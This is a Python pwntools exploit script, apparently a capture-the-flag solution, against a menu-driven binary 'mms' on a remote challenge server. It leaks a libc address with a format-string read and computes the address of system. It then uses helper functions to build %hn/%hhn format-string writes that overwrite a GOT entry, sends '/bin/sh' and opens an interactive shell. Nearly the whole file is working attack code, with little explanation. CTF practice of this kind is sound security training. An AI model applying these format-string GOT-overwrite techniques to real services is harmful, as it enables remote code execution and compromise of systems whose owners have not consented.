from pwn import *
from fmtstr import FormatString

DEBUG = False
if DEBUG:
    p = process(['./mms'])
else:
    p = remote('remote16.goatskin.kr', 13201)
libc = ELF("./libc-2.27.so")
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

oneshot = 0x10a45c #0x4f3c2 #0x4f365  
puts_got = 0x602020
free_got = 0x602018
malloc_got = 0x602040
exit_got = 0x602058
memcpy_got = 0x602038

fmt = FormatString(offset=6, written=6, bits=64)

def fmt(prev , target):
	if prev < target:
		result = target - prev
		return "%" + str(result)  + "c"
	elif prev == target:
		return ""
	else:
		result = 0x10000 + target - prev
		return "%" + str(result) + "c"

def fmt64(offset , target_addr , target_value , prev = 0):
	payload = ""
	for i in range(3):
		payload += p64(target_addr + i * 2)
	payload2 = ""
	for i in range(3):
		target = (target_value >> (i * 16)) & 0xffff 
		payload2 += fmt(prev , target) + "%" + str(offset + 8 + i) + "$hn"
		prev = target
	payload = payload2.ljust(0x40 , "a") + payload
	return payload

def fsb64(offset, addr, value, b=3):
    payload = ''
    prev = 0

    if value == 0:
        payload += '%{}$ln'.format(offset + 1)
        payload += 'A' * ((8 - len(payload) % 8) % 8)
        payload += p64(addr)
        return payload

    for i in range(b):
        target = (value >> (i * 16)) & 0xffff
        
        if prev < target:
            payload += '%{}c'.format(target - prev)
        elif prev > target:
            payload += '%{}c'.format(0x10000 + target - prev)

        payload += '%xx$hn'
        prev = target

    payload += 'A' * ((8 - len(payload) % 8) % 8)

    for i in range(b):
        idx = payload.find("%xx$hn")
        off = offset + (len(payload) / 8) + i
        payload = payload[:idx] + '%{}$hn'.format(off) + payload[idx+6:]

    payload += 'A' * ((8 - len(payload) % 8) % 8)

    for i in range(b):
        payload += p64(addr + i * 2)
    
    return payload


p.sendlineafter("> ", "1")          # get libc base
p.sendlineafter("> ", "M")
p.sendlineafter("> ", "1")
p.sendlineafter("> ", "R")
p.sendlineafter("> ", "0")

for i in range(1):
    p.sendlineafter("> ", "1")      # for oneshot
    p.sendlineafter("> ", "W")
    p.sendlineafter("> ", "0")
    p.sendlineafter("> ", "1")
    p.sendlineafter("> ", "R")
    p.sendlineafter("> ", "0")

#p.sendlineafter("> ", "1")
#p.sendlineafter("> ", "C")
#p.sendlineafter("> ", "0")

p.sendlineafter("> ", "3")
p.sendlineafter("> ", "aaaa")
p.sendlineafter("> ", "1024")
p.sendline("%p%p%p%p"+"A"*8)

p.sendlineafter("> ", "3")
p.recvuntil("----\n")
p.recv(28)

write_libc = int(p.recv(14).split("0x")[1], base=16) - 20
libc_base = write_libc - libc.symbols["write"]
oneshot_libc = write_libc - libc.symbols["write"] + libc.symbols["system"]
#binsh_libc = write_libc - libc.symbols["write"] + libc.search("/bin/sh").next()

print("@@@@@@@@@@@@@@@@@@@@LIBC_GET@@@@@@@@@@@@@@@@@@")


#oneshot_libc = libc_base + oneshot
oneshot = oneshot_libc
oneshot_list = []
of_list = []
for i in range(6):
    oneshot_list.append(oneshot & 0xff)
    oneshot >>= 8
of_list.append(oneshot_list[0])
for i in range(1, 6):
    if oneshot_list[i] > oneshot_list[i-1]:
        of_list.append(oneshot_list[i] - oneshot_list[i-1])
    else:
        of_list.append(0x100 + oneshot_list[i] - oneshot_list[i-1])

for i in range(6):
    print((oneshot_list[i]),)
for i in range(6):
    print((of_list[i]),)

oneshot_low = oneshot_libc & 0xff
oneshot_middle = (oneshot_libc >> 16) & 0xffff
oneshot_high = (oneshot_libc >> 32) & 0xffff

#fmt[puts_got] = p64(oneshot)
#payload, sig = fmt.build()
payload1 = fsb64(0, puts_got, oneshot_low, b=1)
payload2 = fsb64(0, puts_got+2, oneshot_middle, b=1)
payload3 = fsb64(0, puts_got+4, oneshot_high, b=1)

#print(hexdump(payload1))
#print(hexdump(payload2))
#print(hexdump(payload3))

#payload1 = fsb64(0, puts_got, oneshot_low, b=1)

#p.sendlineafter("> ", "3")
#p.sendline(payload1)#.split("\x00\x00")[0])
#p.sendlineafter("> ", "3")

payload = ""

for i in range(6):
    payload += ("%" + str(of_list[i]) + "c" + "%" + str(16+i) + "$hhn")#.ljust(16, " ")
    #payload += p64(free_got+i)

    #print(hexdump(payload))

    #p.sendlineafter("> ", "3")
    #p.sendline(payload)#.split("\x00\x00")[0])
    #p.sendlineafter("> ", "3")

payload = payload.ljust(0x50, " ")
for i in range(6):
    payload += p64(memcpy_got+i)

print(hexdump(payload))

#payload = ("%" + "80" + "c" + "%" + str(8) + "$hhn").ljust(16, " ")
#payload += p64(puts_got)

#payload = fmt64(5, puts_got, oneshot_libc)

#payload = "A" * 0x80
#payload += "%74$hhn"
#payload = payload.ljust(0x90, "A")
#payload += p32(puts_got)

p.sendlineafter("> ", "3")
p.sendline(payload)#.split("\x00\x00")[0])
p.sendlineafter("> ", "3")

p.sendlineafter("> ", "1")
p.sendlineafter("> ", "M")
p.sendlineafter("> ", "1")
p.sendlineafter("> ", "W")
p.sendlineafter("> ", "1")

p.sendlineafter("> ", "3")
p.sendlineafter("> ", "fuck")
p.sendlineafter("> ", "16")
p.sendline("/bin/sh")
p.sendlineafter("> ", "3")
p.sendline("hahahaha")


'''
p.sendlineafter("> ", "1")
p.sendlineafter("> ", "M")
p.sendlineafter("> ", "1")
p.sendlineafter("> ", "C")
p.sendlineafter("> ", "1")

p.sendlineafter("> ", "3")
p.sendlineafter("> ", "sh")
p.sendlineafter("> ", "8")
p.sendline("/bin/sh\x00")

p.sendlineafter("> ", "3")

#print(hexdump(payload))

#gdb.attach(p)

#p.sendlineafter("> ", "A")
'''
p.interactive()